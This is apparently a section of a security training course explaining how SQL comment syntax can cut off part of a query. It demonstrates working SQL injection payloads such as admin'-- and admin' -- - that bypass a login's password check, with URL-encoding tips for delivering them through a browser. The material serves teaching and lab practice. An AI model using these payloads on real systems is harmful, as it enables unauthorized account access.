# 8.10 Using Comments

In this section we will learn how to use comments to subvert the logic of more advanced SQL queries and end up with a working SQL query to bypass the login authentication process.

***

### Comments <a href="#comments" id="comments"></a>

Just like any other language, SQL allows the use of comments as well. Comments are used to document queries or ignore a certain part of the query. We can use two types of line comments with MySQL <mark style="color:$info;">`--`</mark> and <mark style="color:$info;">`#`</mark>, in addition to an in-line comment <mark style="color:$info;">`/**/`</mark> (although this is not typically used in basic sql injections). The <mark style="color:$info;">`--`</mark> can be used as follows:

```bash
mysql> SELECT username FROM logins; -- Selects usernames from the logins table 

+---------------+
| username      |
+---------------+
| admin         |
| administrator |
| john          |
| tom           |
+---------------+
4 rows in set (0.00 sec)
```

> Note: In SQL, using two dashes only is not enough to start a comment. So, there has to be an empty space after them, so the comment starts with (<mark style="color:$info;">--</mark> ), with a space at the end. This is sometimes URL encoded as (<mark style="color:$info;">--+</mark>), as spaces in URLs are encoded as (<mark style="color:$info;">+</mark>). To make it clear, we will add another (<mark style="color:$info;">-</mark>) at the end (<mark style="color:$info;">-- -</mark>), to show the use of a space character.

> Explanation:
>
> Sometimes in URLs, spaces are encoded as `+`. So the comment may appear as:&#x20;
>
> ```sql
> --+
> ```
>
> To make the space more visible, many payloads use:
>
> ```sql
> -- -
> ```
>
> This means:
>
> ```sql
> --<space>-
> ```
>
> The extra dash is only added for clarity or reliability, while the required part is still the **space after `--`**.
>
> Example SQL Injection payload:
>
> ```sql
> admin' -- -
> ```
>
> This may turn the query into:
>
> ```sql
> SELECT * FROM logins WHERE username='admin' -- -'AND password='test';
> ```

The <mark style="color:$info;">`#`</mark> symbol can be used as well.

```bash
mysql> SELECT * FROM logins WHERE username = 'admin'; # You can place anything here AND password = 'something'

+----+----------+----------+---------------------+
| id | username | password | date_of_joining     |
+----+----------+----------+---------------------+
|  1 | admin    | p@ssw0rd | 2020-07-02 00:00:00 |
+----+----------+----------+---------------------+
1 row in set (0.00 sec)
```

> Tip: if you are inputting your payload in the URL within a browser, a (#) symbol is usually considered as a tag, and will not be passed as part of the URL. In order to use (#) as a comment within a browser, we can use '<mark style="color:$info;">%23</mark>', which is an URL encoded (#) symbol.

The server will ignore the part of the query with `AND password = 'something'` during evaluation.

***

### Auth Bypass with comments <a href="#auth-bypass-with-comments" id="auth-bypass-with-comments"></a>

Let us go back to our previous example and inject <mark style="color:$info;">`admin'--`</mark> as our username. The final query will be:

```sql
SELECT * FROM logins WHERE username='admin'-- ' AND password = 'something';
```

As we can see from the syntax highlighting, the username is now `admin`, and the remainder of the query is now ignored as a comment. Also, this way, we can ensure that the query does not have any syntax issues.

Let us try using these on the login page, and log in with the username <mark style="color:$info;">`admin'--`</mark> and anything as the password:

![](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/33/admin_dash.png)

As we see, we were able to bypass the authentication, as the new modified query checks for the username, with no other conditions.

We know from the previous section on comments that we can use them to comment out the rest of the query. So, let us try using <mark style="color:$info;">`admin'--`</mark> as the username.
